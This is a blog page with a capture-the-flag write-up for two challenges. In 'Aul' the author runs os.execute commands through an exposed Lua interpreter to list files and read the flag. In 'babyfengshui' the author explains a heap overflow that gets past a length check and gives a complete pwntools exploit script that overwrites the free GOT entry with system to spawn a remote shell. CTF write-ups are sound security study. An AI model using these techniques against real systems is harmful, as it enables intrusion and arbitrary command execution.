@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        攻防世界-Aul&amp;babyfengshui - 一筐萝卜
+        
+    </title>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/aircloud.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i> 你若盛开，清风自来！ </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar radius">
+            <img src="/img/avatar.jpg">
+        </div>
+        <div class="name">
+            <i>一筐萝卜</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li>
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>主页</span>
+                </a>
+            </li>
+            <li>
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>存档</span>
+                </a>
+            </li>
+            <li>
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>关于</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>搜索</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Aul"><span class="toc-text">Aul</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyfengshui"><span class="toc-text">babyfengshui</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input">
+            <span id="begin-search">搜索</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i> 你若盛开，清风自来！ </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        攻防世界-Aul&amp;babyfengshui
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">发布于：<span>2019-07-30 17:12:00</span></span>
+        
+        <span class="attr">标签：/
+        
+        <a class="tag" href="/tags/#WP" title="WP">WP</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">访问：<span id="busuanzi_value_page_pv"></span>
+</span>
+
+    </div>
+    <div class="post-content no-indent">
+        <h2 id="Aul"><a href="#Aul" class="headerlink" title="Aul"></a>Aul</h2><p>题目提供的文件<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">一筐萝卜➜ ctf  file <span class="keyword">scripty </span></span><br><span class="line"><span class="keyword">scripty: </span>Mach-O <span class="number">64</span>-<span class="keyword">bit </span>x86_64 executable</span><br><span class="line">一筐萝卜➜ ctf</span><br></pre></td></tr></table></figure></p>
+<p>咱也不知道是什么文件，用IDA打开也没有发现什么，用NC连上去，发现输入什么都弹回来一句话,</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lua Error: ?:<span class="number">-1</span>: attempt <span class="built_in">to</span> call <span class="keyword">a</span> <span class="built_in">number</span> <span class="built_in">value</span></span><br></pre></td></tr></table></figure>
+<p>尝试输入<code>help</code>命令，发现回显一段乱码的东西，但是首先出现的是<code>LuaS</code>，百度一下发现是lua语言</p>
+<p>lua语言执行系统命令的方式：</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">os</span>.<span class="built_in">execute</span>(<span class="string">"ls"</span>)</span><br></pre></td></tr></table></figure>
+<p>nc连上去之后直接执行系统命令就可以拿到flag</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\11513&gt;nc.exe 111.198.29.45 48338</span><br><span class="line">let's play a game</span><br><span class="line">| 0 0 0 0 0 0 0 0 |</span><br><span class="line">| 0 1 0 0 0 0 4 0 |</span><br><span class="line">| 0 3 2 2 4 1 4 4 |</span><br><span class="line">| 0 3 2 3 2 3 4 3 |</span><br><span class="line">| 4 b 2 2 4 4 3 4 |</span><br><span class="line">| 3 2 4 4 1 1 2 2 |</span><br><span class="line">| 3 3 c d 3 3 2 3 |</span><br><span class="line">| 3 2 1 4 4 a 2 4 |</span><br><span class="line">os.execute("ls")</span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">flag</span><br><span class="line">lib</span><br><span class="line">lib64</span><br><span class="line">run.sh</span><br><span class="line">scripty</span><br><span class="line">server.lua</span><br><span class="line">server.luac</span><br><span class="line">lua Error: ?:-1: attempt to call a boolean value</span><br><span class="line"></span><br><span class="line">C:\Users\11513&gt;nc.exe 111.198.29.45 48338</span><br><span class="line">let's play a game</span><br><span class="line">| 0 0 0 0 0 0 0 0 |</span><br><span class="line">| 0 1 0 0 0 0 4 0 |</span><br><span class="line">| 0 3 2 2 4 1 4 4 |</span><br><span class="line">| 0 3 2 3 2 3 4 3 |</span><br><span class="line">| 4 b 2 2 4 4 3 4 |</span><br><span class="line">| 3 2 4 4 1 1 2 2 |</span><br><span class="line">| 3 3 c d 3 3 2 3 |</span><br><span class="line">| 3 2 1 4 4 a 2 4 |</span><br><span class="line">os.execute("cat flag")</span><br><span class="line">cyberpeace&#123;db287089ec8fd2c553413508c2c3551d&#125;</span><br><span class="line">lua Error: ?:-1: attempt to call a boolean value</span><br><span class="line"></span><br><span class="line">C:\Users\11513&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="babyfengshui"><a href="#babyfengshui" class="headerlink" title="babyfengshui"></a>babyfengshui</h2><p>典型的堆题，漏洞点在edit</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_8048724</span><span class="params">(<span class="keyword">unsigned</span> __int8 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [esp+17h] [ebp-11h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt; index &amp;&amp; ptr[a1] )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"text length: "</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%u%c"</span>, &amp;v3, &amp;v2);</span><br><span class="line">    <span class="keyword">if</span> ( (v3 + *ptr[a1]) &gt;= ptr[a1] - <span class="number">4</span> )       <span class="comment">// 限制不能覆盖到chunk的prevsize</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"my l33t defenses cannot be fooled, cya!"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"text: "</span>);</span><br><span class="line">    sub_80486BB(*ptr[a1], v3 + <span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>if语句限制不让堆溢出，但是他这种限制只适用于两个结构体相邻的情况，但是如果我们先申请两个结构体，把第一个释放，再创建一个两倍大小的结构体，那么第一个的chunk块就会被第三个所用，那么此时edit第三个结构体的话，第二个结构体我们就可以完全控制</p>
+<ul>
+<li>覆盖des地址，show泄露真实地址</li>
+<li>覆盖free地址为system地址</li>
+<li>调用detele，获取到shell</li>
+</ul>
+<p>exp：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = process(<span class="string">"./babyfengshui"</span>)</span><br><span class="line">    libc = ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = remote(<span class="string">"111.198.29.45"</span>,<span class="number">46190</span>)</span><br><span class="line">    libc = ELF(<span class="string">"/root/LibcSearcher/libc-database/db/libc6-i386_2.23-0ubuntu10_amd64.so"</span>)</span><br><span class="line"></span><br><span class="line">file = ELF(<span class="string">"./babyfengshui"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># r = remote("111.198.29.45",55722)</span></span><br><span class="line">sl = <span class="keyword">lambda</span> x : r.sendline(x)</span><br><span class="line">sd = <span class="keyword">lambda</span> x : r.send(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y : r.sendlineafter(x,y)</span><br><span class="line">rud = <span class="keyword">lambda</span> x : r.recvuntil(x,drop=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x : r.recvuntil(x)</span><br><span class="line">li = <span class="keyword">lambda</span> name,x : log.info(name+<span class="string">":"</span>+hex(x))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(des_size,name,text_size,text)</span>:</span></span><br><span class="line">    ru(<span class="string">"Action: "</span>)</span><br><span class="line">    sl(<span class="string">"0"</span>)</span><br><span class="line">    ru(<span class="string">"size of description: "</span>)</span><br><span class="line">    sl(str(des_size))</span><br><span class="line">    ru(<span class="string">"name: "</span>)</span><br><span class="line">    sl(name)</span><br><span class="line">    ru(<span class="string">"text length: "</span>)</span><br><span class="line">    sl(str(text_size))</span><br><span class="line">    ru(<span class="string">"text: "</span>)</span><br><span class="line">    sl(text)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    ru(<span class="string">"Action: "</span>)</span><br><span class="line">    sl(<span class="string">"1"</span>)</span><br><span class="line">    ru(<span class="string">"index: "</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,text_size,text)</span>:</span></span><br><span class="line">    ru(<span class="string">"Action: "</span>)    </span><br><span class="line">    sl(<span class="string">"3"</span>)</span><br><span class="line">    ru(<span class="string">"index: "</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line">    ru(<span class="string">"text length: "</span>)</span><br><span class="line">    sl(str(text_size))</span><br><span class="line">    ru(<span class="string">"text: "</span>)</span><br><span class="line">    sl(text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    ru(<span class="string">"Action: "</span>)    </span><br><span class="line">    sl(<span class="string">"2"</span>)</span><br><span class="line">    ru(<span class="string">"index: "</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line">    </span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">"000000"</span>,<span class="number">0x80</span>,<span class="string">"a"</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">"111111"</span>,<span class="number">0x80</span>,<span class="string">"b"</span>*<span class="number">0x80</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">"222222"</span>,<span class="number">0x100</span>,<span class="string">"c"</span>*<span class="number">0x100</span>)</span><br><span class="line">puts_got = file.got[<span class="string">'free'</span>]</span><br><span class="line">pay = <span class="string">"a"</span>*(<span class="number">0x10</span>*<span class="number">15</span>+<span class="number">8</span>)+p32(<span class="number">0x110</span>)+p32(<span class="number">0x89</span>)+<span class="string">"a"</span>*(<span class="number">0x10</span>*<span class="number">9</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x89</span>)+p32(puts_got)+<span class="string">"/bin/sh\x00"</span></span><br><span class="line">edit(<span class="number">2</span>,len(pay)+<span class="number">1</span>,pay)</span><br><span class="line"><span class="comment">#show(1)</span></span><br><span class="line">ru(<span class="string">"Action: "</span>)    </span><br><span class="line">sl(<span class="string">"2"</span>)</span><br><span class="line">ru(<span class="string">"index: "</span>)</span><br><span class="line">sl(<span class="string">"1"</span>)</span><br><span class="line">ru(<span class="string">"description: "</span>)</span><br><span class="line">puts_addr = u32(r.recvuntil(<span class="string">"Exit"</span>,drop=<span class="literal">True</span>)[:<span class="number">4</span>])</span><br><span class="line">li(<span class="string">"puts symbols"</span>,libc.symbols[<span class="string">'free'</span>])</span><br><span class="line">li(<span class="string">"puts_addr"</span>,puts_addr)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">obj = LibcSearcher("puts", puts_addr)</span></span><br><span class="line"><span class="string">puts_symbols = obj.dump("puts")</span></span><br><span class="line"><span class="string">base_addr = puts_addr-puts_symbols</span></span><br><span class="line"><span class="string">system_addr = obj.dump("system")+base_addr</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">base_addr = puts_addr-libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">li(<span class="string">"base_addr"</span>,base_addr)</span><br><span class="line">system_addr = base_addr+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">li(<span class="string">"system_addr"</span>,system_addr)</span><br><span class="line">pay = p32(system_addr)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">"333333"</span>,<span class="number">0x0a</span>,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">edit(<span class="number">1</span>,len(pay)+<span class="number">1</span>,pay)</span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"><span class="comment"># raw_input()</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></p>
+
+        
+        <br>
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        转发请备注<a href="“https://luobuming.github.io”">一筐萝卜</a>的个人博客 <br>
+        本站总访问量<span id="busuanzi_value_site_pv"></span>次
+       </p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+</html>
